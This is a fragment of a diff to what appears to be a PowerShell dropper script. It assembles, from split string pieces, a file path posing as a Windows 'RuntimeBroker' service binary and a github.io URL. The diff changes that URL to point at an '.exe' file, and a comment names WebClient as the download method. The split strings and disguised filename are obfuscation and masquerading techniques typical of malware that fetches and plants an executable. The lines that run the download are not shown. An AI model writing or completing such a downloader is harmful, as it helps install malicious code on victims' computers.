@@ -6,7 +6,7 @@ $b = '\Microsoft\Win' + 'dows\Run' + 'timeBro' + 'ker_svc.exe'
 $p = $a + $b
 
 $h = 'https://fairytail5d' + '0.github.io'
-$r = '/abobis/sync'
+$r = '/abobis/sync.exe'
 $u = $h + $r
 
 # method 1 — WebClient (reliable, no BITS dependency)
